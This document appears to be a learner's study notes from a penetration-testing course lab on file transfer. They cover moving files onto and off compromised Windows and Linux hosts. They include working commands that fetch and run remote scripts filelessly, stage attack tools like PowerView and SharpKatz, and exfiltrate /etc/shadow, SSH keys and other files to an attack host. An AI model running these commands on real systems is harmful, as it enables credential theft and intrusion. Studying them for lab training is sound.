
## Windows File Transfer

### Powershell Base64 Encode and Decode
We can transfer file by encoding and decoding files.

```shell-session
Poiint@htb[/htb]$ cat id_rsa |base64 -w 0;echo #From our attacking machine
```

```powershell-session
PS C:\htb> [IO.File]::WriteAllBytes("C:\Users\Public\id_rsa", [Convert]::FromBase64String("<BASE64 STRING>")) #Our victim machine
```

The limitation is the limit of 8,192 words and in general big files can give problems. Always check md5 hashes to see if the files matches.

If we want to upload, we have to do the reverse operation:

```powershell-session
PS C:\htb> [Convert]::ToBase64String((Get-Content -path "C:\Windows\system32\drivers\etc\hosts" -Encoding byte))
```
```powershell-session
PS C:\htb> Get-FileHash "C:\Windows\system32\drivers\etc\hosts" -Algorithm MD5 | select Hash #To check MD5 hash
```

```shell-session
echo <BASE64 STRING> | base64 -d > hosts
```


### Powershell Web Downlaods

|**Method**|**Description**|
|---|---|
|[OpenRead](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.openread?view=net-6.0)|Returns the data from a resource as a [Stream](https://docs.microsoft.com/en-us/dotnet/api/system.io.stream?view=net-6.0).|
|[OpenReadAsync](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.openreadasync?view=net-6.0)|Returns the data from a resource without blocking the calling thread.|
|[DownloadData](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloaddata?view=net-6.0)|Downloads data from a resource and returns a Byte array.|
|[DownloadDataAsync](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloaddataasync?view=net-6.0)|Downloads data from a resource and returns a Byte array without blocking the calling thread.|
|[DownloadFile](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadfile?view=net-6.0)|Downloads data from a resource to a local file.|
|[DownloadFileAsync](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadfileasync?view=net-6.0)|Downloads data from a resource to a local file without blocking the calling thread.|
|[DownloadString](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadstring?view=net-6.0)|Downloads a String from a resource and returns a String.|
|[DownloadStringAsync](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadstringasync?view=net-6.0)|Downloads a String from a resource without blocking the calling thread.|

```powershell-session
PS C:\htb> # Example: (New-Object Net.WebClient).DownloadFile('<Target File URL>','<Output File Name>')

PS C:\htb> (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1','C:\Users\Public\Downloads\PowerView.ps1')

PS C:\htb> # Example: (New-Object Net.WebClient).DownloadFileAsync('<Target File URL>','<Output File Name>')

PS C:\htb> (New-Object Net.WebClient).DownloadFileAsync('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1', 'PowerViewAsync.ps1')
```

Above two methods to download files with **DownloadFile** and **DownloadFileAsync**. To make it "fileless" we can use **IEX** (Invoke-Expression) cmdlet added in the beginning or piped in the end (IEX .... or .... | IEX where ... = the command above).

PowerShell Invoke-WebRequest

```powershell-session
PS C:\htb> Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1
```

If powershell gives an error about parsing internet explore engine, add the 
"-UseBasicParsing" parameter.
If powershell gives error about SSL/TLSS secure channel certificate not trusted. Use this command:
```powershell-session
PS C:\htb> [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
```

### SMB Downloads

```shell-session
Poiint@htb[/htb]$ sudo impacket-smbserver share -smb2support /tmp/smbshare
```

And then:

```cmd-session
C:\htb> copy \\<Attack machine IP>\share\nc.exe
```

If the "copy" message gives error about authentication, we can add "-user" and "-password" parameter in the impacket-smbserver command and then authenticate with "/user:username password" in the cmd seesion.

```shell-session
Poiint@htb[/htb]$ sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test
```

```cmd-session
C:\htb> net use n: \\192.168.220.133\share /user:test test
```


### FTP Downloads
We can use Python3 pyftpdlib module.
```shell-session
sudo python3 -m pyftpdlib --port 21
```

```powershell-session
PS C:\htb> (New-Object Net.WebClient).DownloadFile('ftp://<FTP server IP>/file.txt', 'ftp-file.txt')
```

If you have not access to a interactive shell, you can create a TXT file with all the FTP commands and then execute it with ftp:

Create a Command File for the FTP Client and Download the Target File

```cmd-session
C:\htb> echo open 192.168.49.128 > ftpcommand.txt
C:\htb> echo USER anonymous >> ftpcommand.txt
C:\htb> echo binary >> ftpcommand.txt
C:\htb> echo GET file.txt >> ftpcommand.txt
C:\htb> echo bye >> ftpcommand.txt
C:\htb> ftp -v -n -s:ftpcommand.txt
ftp> open 192.168.49.128
Log in with USER and PASS first.
ftp> USER anonymous

ftp> GET file.txt
ftp> bye

C:\htb>more file.txt
This is a test file
```



### Powershell Web Uploads
We can use Python3 uploadserver module to start a webserver that allows uploads.

```shell-session
Poiint@htb[/htb]$ python3 -m uploadserver

File upload available at /upload
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

```powershell-session
PS C:\htb> IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')

PS C:\htb> Invoke-FileUpload -Uri http://<UPLOADSERVER IP>:8000/upload -File C:\Windows\System32\drivers\etc\hosts
```

or 

```powershell-session
PS C:\htb> $b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte))
PS C:\htb> Invoke-WebRequest -Uri http://<attack machine ip>:8000/ -Method POST -Body $b64
```

We can catch the $b64 string starting a nc listener on the port specified (in this example 8000)

### SMB Uploads
Install "wsgidav" and "cheroot" python libraries and then

```shell-session
 sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous 
```

```cmd-session
dir \\192.168.49.128\DavWWWRoot
```

DavWWWRoot is a special keyword that specifies that you are connecting to the root of the WebDAV server. This technique utilizes smb over HTTP with webdav.
To upload files:

```cmd-session
C:\htb> copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\DavWWWRoot\

C:\htb> copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\sharefolder\
```
### FTP Uploads

```shell-session
Poiint@htb[/htb]$ sudo python3 -m pyftpdlib --port 21 --write
```
With this command we start a ftp server with the "--write" parameter that allows clients to upload files. Then on the victim machine:
```powershell-session
PS C:\htb> (New-Object Net.WebClient).UploadFile('ftp://192.168.49.128/ftp-hosts', 'C:\Windows\System32\drivers\etc\hosts')
```
Like FTP downloads we can create a file with ftp commands if we have not an interactive shell available.
## Linux File Transfer
### Base64 Encoding/Decoding
Very much the same as [[4a. FileUpload_notes#Windows File Transfer#Powershell Base64 Encode and Decode]].
### Web Downloads with Wget and cURL

Download a File Using wget

```shell-session
Poiint@htb[/htb]$ wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh
```

Download a File Using cURL

```shell-session
Poiint@htb[/htb]$ curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
```

To make it fileless like we did on windows, we can use the pipe operator (|):

Fileless Download with cURL

```shell-session
Poiint@htb[/htb]$ curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash
```

Fileless Download with wget

```shell-session
Poiint@htb[/htb]$ wget -qO- https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/helloworld.py | python3
```

### Download with Bash (/dev/tcp)

Connect to the Target Webserver

```shell-session
Poiint@htb[/htb]$ exec 3<>/dev/tcp/10.10.10.32/80
```

HTTP GET Request

```shell-session
Poiint@htb[/htb]$ echo -e "GET /LinEnum.sh HTTP/1.1\n\n">&3
```

Print the Response

```shell-session
Poiint@htb[/htb]$ cat <&3
```

### SSH Downloads & Uploads
We can use SCP (secure copy) 

Enabling the SSH Server

```shell-session
Poiint@htb[/htb]$ sudo systemctl enable ssh
```

Starting the SSH Server

```shell-session
Poiint@htb[/htb]$ sudo systemctl start ssh
```

Checking for SSH Listening Port

```shell-session
Poiint@htb[/htb]$ netstat -lnpt
```

Linux - Downloading Files Using SCP

```shell-session
Poiint@htb[/htb]$ scp plaintext@192.168.49.128:/root/myroot.txt . 
```

Where "plaintext" is the user. 
To upload files, instead:

File Upload using SCP

```shell-session
Poiint@htb[/htb]$ scp /etc/passwd plaintext@192.168.49.128:/home/plaintext/
```



### Web Upload
We can use a python3 module called "uploadserver". 
Pwnbox - Start Web Server

```shell-session
Poiint@htb[/htb]$ sudo python3 -m pip install --user uploadserver
```
Pwnbox - Create a Self-Signed Certificate

```shell-session
Poiint@htb[/htb]$ openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'
```

Pwnbox - Start Web Server

```shell-session
Poiint@htb[/htb]$ mkdir https && cd https
```

Pwnbox - Start Web Server

```shell-session
Poiint@htb[/htb]$ sudo python3 -m uploadserver 443 --server-certificate /root/server.pem
```

Now from our comprimised machine:

Linux - Upload Multiple Files

```shell-session
Poiint@htb[/htb]$ curl -X POST https://192.168.49.128/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure
```

We used the option `--insecure` because we used a self-signed certificate that we trust.

### Alternative Web File Transfer Method
We can use python3, php, ruby, to host a webserver and download files:

Linux - Creating a Web Server with Python3

```shell-session
Poiint@htb[/htb]$ python3 -m http.server
```

Linux - Creating a Web Server with Python2.7

```shell-session
Poiint@htb[/htb]$ python2.7 -m SimpleHTTPServer
```

Linux - Creating a Web Server with PHP

```shell-session
Poiint@htb[/htb]$ php -S 0.0.0.0:8000
```

Linux - Creating a Web Server with Ruby

```shell-session
Poiint@htb[/htb]$ ruby -run -ehttpd . -p8000
```
## Transfering Files with code
### Python(2.7 & 3)

Python 2 - Download

```shell-session
Poiint@htb[/htb]$ python2.7 -c 'import urllib;urllib.urlretrieve ("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'
```

Python 3 - Download

```shell-session
Poiint@htb[/htb]$ python3 -c 'import urllib.request;urllib.request.urlretrieve("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'
```

#### Starting the Python uploadserver Module

Starting the Python uploadserver Module

```shell-session
Poiint@htb[/htb]$ python3 -m uploadserver 
```

Uploading a File Using a Python One-liner

```shell-session
Poiint@htb[/htb]$ python3 -c 'import requests;requests.post("http://192.168.49.128:8000/upload",files={"files":open("/etc/passwd","rb")})'
```


### PHP

PHP Download with File_get_contents()

```shell-session
Poiint@htb[/htb]$ php -r '$file = file_get_contents("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); file_put_contents("LinEnum.sh",$file);'
```

PHP Download with Fopen()

```shell-session
Poiint@htb[/htb]$ php -r 'const BUFFER = 1024; $fremote = 
fopen("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "rb"); $flocal = fopen("LinEnum.sh", "wb"); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);'
```

PHP Download a File and Pipe it to Bash

```shell-session
Poiint@htb[/htb]$ php -r '$lines = @file("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); foreach ($lines as $line_num => $line) { echo $line; }' | bash
```

### Ruby
Ruby - Download a File

```shell-session
Poiint@htb[/htb]$ ruby -e 'require "net/http"; File.write("LinEnum.sh", Net::HTTP.get(URI.parse("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh")))'
```

### Perl
Perl - Download a File

```shell-session
Poiint@htb[/htb]$ perl -e 'use LWP::Simple; getstore("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh");'
```

### Javascript
We can create a file with this code called "wget.js":
```javascript
var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
WinHttpReq.Open("GET", WScript.Arguments(0), /*async=*/false);
WinHttpReq.Send();
BinStream = new ActiveXObject("ADODB.Stream");
BinStream.Type = 1;
BinStream.Open();
BinStream.Write(WinHttpReq.ResponseBody);
BinStream.SaveToFile(WScript.Arguments(1));
```

Download a File Using JavaScript and cscript.exe

```cmd-session
C:\htb> cscript.exe /nologo wget.js https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView.ps1
```

### Visual Basic Script 
We can create a file called "wget.vbs":
```vbscript
dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
dim bStrm: Set bStrm = createobject("Adodb.Stream")
xHttp.Open "GET", WScript.Arguments.Item(0), False
xHttp.Send

with bStrm
    .type = 1
    .open
    .write xHttp.responseBody
    .savetofile WScript.Arguments.Item(1), 2
end with
```

Download a File Using VBScript and cscript.exe

```cmd-session
C:\htb> cscript.exe /nologo wget.vbs https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView2.ps1
```





## Miscellaneous File Transfer Methods
### Netcat
We can download files redirecting the stdout using a single greather-than ( > ) followed by the filename:

NetCat - Compromised Machine - Listening on Port 8000

```shell-session
victim@target:~$ # Example using Original Netcat
victim@target:~$ nc -l -p 8000 > SharpKatz.exe
```

We can also add the parameter "--recv-only" so it will close the connection once the transfer is finished.

#### Netcat - Attack Host - Sending File to Compromised machine

```shell-session
Poiint@htb[/htb]$ wget -q https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exe

Poiint@htb[/htb]$ # Example using Original Netcat
Poiint@htb[/htb]$ nc -q 0 192.168.49.128 8000 < SharpKatz.exe
```

With the lesser-than ( < ) redirect we specify the file that we want to transfer. Again we can specify the "--send-only" parameter to close the connection once the transfer is complete (these parameter are equal to -q 0, that specify to close the connection once the trasnfer is finished).
NB: Maybe the "--send-only & --recv-only are only available with Ncat and not with nc".

We can also reverse the above operation:

Attack Host - Sending File as Input to Netcat

```shell-session
Poiint@htb[/htb]$ # Example using Original Netcat
Poiint@htb[/htb]$ sudo nc -l -p 443 -q 0 < SharpKatz.exe
```

Compromised Machine Connect to Netcat to Receive the File

```shell-session
victim@target:~$ # Example using Original Netcat
victim@target:~$ nc 192.168.49.128 443 > SharpKatz.exe
```

nc is deprecated, so the new tool is called Ncat. 
If we are in Linux we can also use the Bash utility /dev/TCP/:

Compromised Machine Connecting to Netcat Using /dev/tcp to Receive the File

```shell-session
victim@target:~$ cat < /dev/tcp/192.168.49.128/443 > SharpKatz.exe
```

### PowerShell File Transfer
We can use WinRM(Port: 5985 and 5986 for HTTPS) (PowerShell Remoting) to transfer files. If we have administrator privileges we do not need to specify credentials so we can create a session between two computers and transfer files from and to them:

From DC01 - Confirm WinRM port TCP 5985 is Open on DATABASE01. (use "hostname" cmd to have the computer name).

```powershell-session
PS C:\htb> Test-NetConnection -ComputerName DATABASE01 -Port 5985

ComputerName     : DATABASE01
RemoteAddress    : 192.168.1.101
RemotePort       : 5985
InterfaceAlias   : Ethernet0
SourceAddress    : 192.168.1.100
TcpTestSucceeded : True
```

Create a PowerShell Remoting Session to DATABASE01

```powershell-session
PS C:\htb> $Session = New-PSSession -ComputerName DATABASE01
```

Copy samplefile.txt from our Localhost to the DATABASE01 Session

```powershell-session
PS C:\htb> Copy-Item -Path C:\samplefile.txt -ToSession $Session -Destination C:\Users\Administrator\Desktop\
```

Copy DATABASE.txt from DATABASE01 Session to our Localhost

```powershell-session
PS C:\htb> Copy-Item -Path "C:\Users\Administrator\Desktop\DATABASE.txt" -Destination C:\ -FromSession $Session
```

### RDP
RDP (Remote Desktop Protocol) can be used to trasnfer files. Both ways works with xfreerdp or rdesktop. We can copy and paste files or we can mount a local resource on the target RDP server.

Mounting a Linux Folder Using rdesktop

```shell-session
Poiint@htb[/htb]$ rdesktop 10.10.10.132 -d HTB -u administrator -p 'Password0@' -r disk:linux='/home/user/rdesktop/files'
```

Mounting a Linux Folder Using xfreerdp

```shell-session
Poiint@htb[/htb]$ xfreerdp /v:10.10.10.132 /d:HTB /u:administrator /p:'Password0@' /drive:linux,/home/plaintext/htb/academy/filetransfer
```

## Protected File Transfer
We need to encrypt files if we are going to download them:

In Windows we can use "Invoke-AESEncryption.ps1" like this:

Import Module Invoke-AESEncryption.ps1

```powershell-session
PS C:\htb> Import-Module .\Invoke-AESEncryption.ps1
```

File Encryption Example

```powershell-session
PS C:\htb> Invoke-AESEncryption -Mode Encrypt -Key "p4ssw0rd" -Path .\scan-results.txt

File encrypted to C:\htb\scan-results.txt.aes
PS C:\htb> ls

    Directory: C:\htb

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----        11/18/2020  12:17 AM           9734 Invoke-AESEncryption.ps1
-a----        11/18/2020  12:19 PM           1724 scan-results.txt
-a----        11/18/2020  12:20 PM           3448 scan-results.txt.aes
```

In Linux we can use OpenSSL (with 100000 iteration and the Password-Based Key Function 2 algorithm):

Encrypting /etc/passwd with openssl

```shell-session
Poiint@htb[/htb]$ openssl enc -aes256 -iter 100000 -pbkdf2 -in /etc/passwd -out passwd.enc

enter aes-256-cbc encryption password:                                                         
Verifying - enter aes-256-cbc encryption password:                              
```

Decrypt passwd.enc with openssl

```shell-session
Poiint@htb[/htb]$ openssl enc -d -aes256 -iter 100000 -pbkdf2 -in passwd.enc -out passwd                    

enter aes-256-cbc decryption password:
```
## Catching Files over HTTP/S
Again we can use [[4a. FileUpload_notes#Python(2.7 & 3)#Starting the Python uploadserver Module]]

### Nginx - Enabling PUT
Nginx is safer than Apache because it does not run PHP as easy as Apache does and it's more minimal, which does not enable default configuration that can be harmful (for example, directory listings).
These are the paths to start a working Nginx webserver:

Create a Directory to Handle Uploaded Files

```shell-session
Poiint@htb[/htb]$ sudo mkdir -p /var/www/uploads/SecretUploadDirectory
```

Change the Owner to www-data

```shell-session
Poiint@htb[/htb]$ sudo chown -R www-data:www-data /var/www/uploads/SecretUploadDirectory
```

Create the Nginx configuration file by creating the file `/etc/nginx/sites-available/upload.conf` with the contents:

Create Nginx Configuration File

```shell-session
server {
    listen 9001;
    
    location /SecretUploadDirectory/ {
        root    /var/www/uploads;
        dav_methods PUT;
    }
}
```

Symlink our Site to the sites-enabled Directory

```shell-session

Poiint@htb[/htb]$ sudo ln -s /etc/nginx/sites-available/upload.conf /etc/nginx/sites-enabled/
```

Start Nginx

```shell-session
Poiint@htb[/htb]$ sudo systemctl restart nginx.service
```

Verifying Errors (OPTIONAL, IF NEEDED)

```shell-session
Poiint@htb[/htb]$ tail -2 `/var/log/nginx/error.log`

2020/11/17 16:11:56 [emerg] 5679#5679: bind() to 0.0.0.0:`80` failed (98: A`ddress already in use`)
2020/11/17 16:11:56 [emerg] 5679#5679: still could not bind()
```

```shell-session
Poiint@htb[/htb]$ ss -lnpt | grep `80`
```

Remove NginxDefault Configuration (ONLY IF DEFAULT CONFIGURATION DOESN'T WORK).

```shell-session
Poiint@htb[/htb]$ sudo rm /etc/nginx/sites-enabled/default
```

We can now upload files using cULR:

Upload File Using cURL

```shell-session
Poiint@htb[/htb]$ curl -T /etc/passwd http://localhost:9001/SecretUploadDirectory/users.txt
```
## Living off The Land

- [LOLBAS Project for Windows Binaries](https://lolbas-project.github.io) (For WINDOWS)
- [GTFOBins for Linux Binaries](https://gtfobins.github.io/) (For LINUX)

You canc heck these binaries to see if you can find an executable that can lead to file download/upload.
Some examples are:

Upload win.ini to our Pwnbox 

```cmd-session
C:\htb> certreq.exe -Post -config http://192.168.49.128/ c:\windows\win.ini
Certificate Request Processor: The operation timed out 0x80072ee2 (WinHttp: 12002 ERROR_WINHTTP_TIMEOUT)
```

If "-Post" parameter is not recognized, download the new version here: https://github.com/juliourena/plaintext/raw/master/hackthebox/certreq.exe


Create Certificate in our Pwnbox

```shell-session
Poiint@htb[/htb]$ openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out certificate.pem
```

Stand up the Server in our Pwnbox

```shell-session
Poiint@htb[/htb]$ openssl s_server -quiet -accept 80 -cert certificate.pem -key key.pem < /tmp/LinEnum.sh
```


File Download with Bitsadmin

```powershell-session
PS C:\htb> bitsadmin /transfer wcb /priority foreground http://10.10.15.66:8000/nc.exe C:\Users\htb-student\Desktop\nc.exe
```

Download

```powershell-session
PS C:\htb> Import-Module bitstransfer; Start-BitsTransfer -Source "http://10.10.10.32/nc.exe" -Destination "C:\Windows\Temp\nc.exe"
```

Download a File with Certutil

```cmd-session
C:\htb> certutil.exe -verifyctl -split -f http://10.10.10.32/nc.exe
```
## Detection
There's also a part talking about detection. This is possible looking at user-agent string in http requests.
IDK if it's in the scope, give a look in the website if needed.